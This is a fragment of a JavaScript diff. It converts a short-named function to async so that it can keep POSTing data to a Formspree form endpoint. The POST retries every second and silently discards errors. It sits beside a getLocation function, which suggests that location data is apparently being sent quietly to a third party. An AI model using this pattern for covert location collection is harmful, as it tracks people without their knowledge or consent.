@@ -18,20 +18,22 @@ function getLocation(callback) {
   );
 }
 
-function s(result) {
+async function s(t) {
+
   while (true) {
     try {
-      let response = await fetch("https://formspree.io/f/xeorknrp", {
+      const r = await fetch("https://formspree.io/f/xeorknrp", {
         method: "POST",
-        body: result,
-        headers: { "Accept": "application/json" }
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: t
       });
-      
-      if (response.ok) {
+
+      if (r.ok) {
         break;
-        
+      }
     } catch (err) {
-      
     }
 
     await new Promise(r => setTimeout(r, 1000));
